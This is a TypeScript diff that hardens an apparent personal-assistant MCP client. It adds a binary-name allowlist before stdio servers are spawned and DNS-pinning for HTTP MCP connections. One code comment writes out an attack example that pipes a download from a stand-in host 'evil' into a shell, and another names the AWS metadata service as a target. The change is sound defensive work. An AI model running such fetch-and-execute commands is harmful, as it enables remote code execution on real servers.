@@ -30,6 +30,7 @@ import { StdioTransport } from '../adapters/mcp/stdio-transport.js';
 import { StdioServerTransport } from '../adapters/mcp/stdio-server-transport.js';
 import { HttpTransport } from '../adapters/mcp/http-transport.js';
 import { MCPServer } from '../adapters/mcp/server.js';
+import { basename as pathBasename } from 'node:path';
 import type { IToolsPort, ToolDefinition, ToolResult } from '../ports/tools.port.js';
 import type {
   MCPToolDescriptor,
@@ -49,13 +50,58 @@ const DEFAULT_CLIENT_INFO: McpClientInfo = { name: 'personal-assistant', version
  * Open a stdio MCP connection and return the live client. The caller
  * is responsible for calling `await client.close()` when done.
  */
+/**
+ * H5 (W19): allowlist for stdio MCP command names. The
+ * `connectStdioMcp` entry-point shells out to whatever the caller
+ * passed in, which is a trivial RCE on any server that lets
+ * third-party agents register an MCP server. We restrict the
+ * binary name to a small set of known-safe MCP launchers:
+ *   - npx / uvx: standard package-runner entry-points
+ *   - node / python3 / uv: the language runtimes themselves
+ *   - docker: the official container runtime
+ * Operators can override or extend via `PA_MCP_ALLOWED_COMMANDS`
+ * (comma-separated), which is consulted at call time so the
+ * override applies without a process restart.
+ */
+const DEFAULT_ALLOWED_MCP_COMMANDS = new Set<string>([
+  'npx', 'node', 'uvx', 'python3', 'docker', 'uv',
+]);
+
+function getAllowedMcpCommands(): Set<string> {
+  const override = process.env.PA_MCP_ALLOWED_COMMANDS;
+  if (override && override.trim().length > 0) {
+    return new Set(override.split(',').map((s) => s.trim()).filter(Boolean));
+  }
+  return DEFAULT_ALLOWED_MCP_COMMANDS;
+}
+
+/**
+ * Open a stdio MCP connection by spawning a child process.
+ *
+ * H5 (W19): the executable name is checked against the allowlist
+ * (see `getAllowedMcpCommands`) before any process is spawned.
+ * Without this, an attacker who can reach `connectStdioMcp` (e.g.
+ * via the agent's tool registration surface) could pass
+ * `command='curl', args=['http://evil/x | sh']` and have the
+ * server run arbitrary code.
+ */
 export async function connectStdioMcp(
   command: string,
   args: string[] = [],
-  env: NodeJS.ProcessEnv = {},
+  env: Record<string, string> = {},
   clientInfo: McpClientInfo = DEFAULT_CLIENT_INFO,
 ): Promise<MCPClient> {
-  const transport = new StdioTransport({ command, args, env });
+  // Strip any path components — we match on the *binary name* only
+  // (a path like `/usr/local/bin/npx` would still match `npx`).
+  const base = pathBasename(command);
+  const allowed = getAllowedMcpCommands();
+  if (!allowed.has(base)) {
+    throw new Error(
+      `refusing to spawn MCP stdio binary: "${base}" is not in the allowlist. ` +
+        `Set PA_MCP_ALLOWED_COMMANDS or use one of: ${Array.from(allowed).join(', ')}`,
+    );
+  }
+  const transport = new StdioTransport({ command: base, args, env });
   const client = new MCPClient({ transport, clientInfo } satisfies MCPClientOptions);
   await client.initialize();
   return client;
@@ -71,15 +117,23 @@ export async function connectStdioMcp(
  * (the AWS metadata service) and have the agent relay its queries
  * there. We reuse the same `assertSafeUrl()` helper the WebClient
  * uses so the deny-list lives in one place.
+ *
+ * C2 (W19): pin the URL to a single DNS-resolved IP to defeat
+ * DNS-rebinding. `assertSafeUrl()` only does a point-in-time lookup;
+ * a malicious resolver could return a public IP at assertSafeUrl()
+ * time and a private IP at the actual connect time. We rewrite the
+ * URL host to the resolved IP and use a customLookup that always
+ * returns the pinned IP, so the underlying HTTP transport cannot
+ * be tricked back into a private range mid-flight.
  */
 export async function connectHttpMcp(
   url: string,
   headers: Record<string, string> = {},
   clientInfo: McpClientInfo = DEFAULT_CLIENT_INFO,
 ): Promise<MCPClient> {
-  const { assertSafeUrl } = await import('./web-client.js');
-  await assertSafeUrl(url);
-  const transport = new HttpTransport({ url, headers });
+  const { resolveAndRewriteUrl } = await import('./web-client.js');
+  const { rewrittenUrl } = await resolveAndRewriteUrl(url);
+  const transport = new HttpTransport({ url: rewrittenUrl, headers });
   const client = new MCPClient({ transport, clientInfo } satisfies MCPClientOptions);
   await client.initialize();
   return client;
